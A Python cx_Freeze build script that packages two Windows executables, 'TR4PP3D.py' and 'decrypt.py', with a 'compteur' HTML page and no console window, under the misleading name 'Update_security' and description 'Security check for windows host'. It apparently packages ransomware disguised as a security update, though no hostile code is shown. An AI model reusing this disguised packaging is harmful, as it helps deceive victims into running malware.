#!/usr/bin/python
#coding:utf-8
import sys
from cx_Freeze import setup, Executable

path = sys.path
includefiles = ["assets/compteur.html"]
includes = []
excludes = []
packages = ['modules']

options = {"path": path,
           "include_files": includefiles,
           "includes": includes,
           "excludes": excludes,
           "packages": packages
           }

base = None
if (sys.platform == "win32"):
    base = "Win32GUI"
setup(
        name = "Update_security",
        version = "2.0",
        description = "Security check for windows host",
        options = {"build_exe": options},
        executables = [Executable("TR4PP3D.py", base=base),
                       Executable("decrypt.py", base=base)]
)
